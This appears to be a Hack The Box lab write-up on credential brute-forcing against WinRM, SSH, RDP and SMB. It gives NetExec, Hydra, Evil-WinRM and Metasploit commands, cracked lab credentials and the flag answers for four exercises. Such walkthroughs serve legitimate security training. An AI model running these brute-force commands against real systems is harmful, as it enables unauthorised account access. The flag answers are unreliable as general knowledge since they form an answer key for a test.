# Network Services
## WinRM
[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (`WinRM`) is the Microsoft implementation of the Web Services Management Protocol (WS-Management). It is a network protocol based on **XML web** services using the Simple Object Access Protocol (`SOAP`) used for remote management of Windows systems.

For security reasons, WinRM must be activated and configured manually in Windows 10/11. 

A handy tool that we can use for our password attacks is [NetExec](https://github.com/Pennyw0rth/NetExec), which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. 
### NetExec
**Install**
```
$ sudo apt-get -y install netexe
```
**Usage**
```
$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
Another handy tool that we can use to communicate with the WinRM service is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), which allows us to communicate with the WinRM service efficiently.

### Evil-WinRM
**Install**
```
$ sudo gem install evil-winrm
```
**Evil-WinRM Usage**
```
$ evil-winrm -i <target-IP> -u <username> -p <password>
```

## SSH
### Hydra - SSH
```
$ hydra -L user.list -P password.list ssh://<ip>
```

## Remote Desktop Protocol (RDP)
### Hydra - RDP
```
$ hydra -L user.list -P password.list rdp://<ip>
```
Linux offers different clients to communicate with the desired server using the RDP protocol. These include Remmina, xfreerdp, and many others. 
```
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```
## SMB
### Hydra - SMB
```
$ hydra -L user.list -P password.list smb://<ip>
```
However, we may also get the following error describing that the server has sent an invalid reply.
```
[ERROR] invalid reply from target smb://<ip>:445/
```
This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.
### Metasploit Framework
```
$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
```
Now we can use NetExec again to view the available shares and what privileges we have for them.
```
$ netexec smb 10.129.42.197 -u "user" -p "password" --shares
```
To communicate with the server via SMB, we can use the tool **smbclient**. This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.
```
$ smbclient -U user \\\\10.129.42.197\\SHARENAME

Enter WORKGROUP\user's password: *******

Try "help" to get a list of possible commands.


smb: \>
```

## Questions
1. Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer. **Answer: HTB{That5Novemb3r}**
   - `$ netexec winrm 10.129.105.2 -u ./username.list -p ./password.list` → Found `john`:`november`
   - `$ evil-winrm -i 10.129.105.2 -u john -p november` → Find the flag in `C:\Users\john\Desktop\flag.txt`
2. Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer. **Answer: HTB{Let5R0ck1t}**
   - `$ hydra -L username.list -P password.list ssh://10.129.105.2` → Found `dennis`:`rockstar`
   - `$ ssh dennis@10.129.105.2`
   - `dennis@WINSRV C:\Users\dennis\Desktop>type flag.txt`
3. Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer. **Answer: HTB{R3m0t3DeskIsw4yT00easy}**
   - `$ hydra -L username.list -P password.list rdp://10.129.105.2` → Found `chris`:`789456123`
   - View the flag in Desktop
4. Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer. **Answer: HTB{S4ndM4ndB33}**
   - Use the `auxiliary/scanner/smb/smb_login` module in `msfconsole` with these options:
     - `CreateSession`: `true`
     - `RHOSTS`: `10.129.105.2`
     - `USER_FILE`: `/home/htb-ac-1863259/username.list`
     - `PASS_FILE`: `/home/htb-ac-1863259/password.list`
   - Open sessions to view the established sessions (try all those sessions but only session with credentials `cassie`:`12345678910` works):
        ```
        [msf](Jobs:0 Agents:4) auxiliary(scanner/smb/smb_login) >> sessions 5
        [*] Starting interaction with 5...

        SMB (10.129.105.2) > shares
        Shares
        ======

            #  Name    Type          comment
            -  ----    ----          -------
            0  ADMIN$  DISK|SPECIAL  Remote Admin
            1  C$      DISK|SPECIAL  Default share
            2  CASSIE  DISK
            3  IPC$    IPC|SPECIAL   Remote IPC
        ```
   - Enter `CASSIE`'s share and read the flag:
        ```
        > shares -i 2
        [+] Successfully connected to CASSIE
        SMB (10.129.105.2\CASSIE) > ls
        ls 
        ===

            #  Type  Name         Created                    Accessed                   Written                    Changed                    Size
            -  ----  ----         -------                    --------                   -------                    -------                    ----
            0  DIR   .            2022-01-06T08:44:49-06:00  2022-01-06T11:48:47-06:00  2022-01-06T11:48:47-06:00  2022-01-06T11:48:47-06:00
            1  DIR   ..           2022-01-06T08:44:49-06:00  2022-01-06T11:48:47-06:00  2022-01-06T11:48:47-06:00  2022-01-06T11:48:47-06:00
            2  FILE  desktop.ini  2022-01-06T08:44:52-06:00  2022-01-06T08:44:52-06:00  2022-01-06T08:44:52-06:00  2022-01-06T09:45:14-06:00  282
            3  FILE  flag.txt     2022-01-06T08:45:16-06:00  2022-01-06T08:46:14-06:00  2022-01-06T08:46:14-06:00  2022-01-06T09:45:14-06:00  16

        SMB (10.129.105.2\CASSIE) > cat flag.txt
        HTB{S4ndM4ndB33}
        ```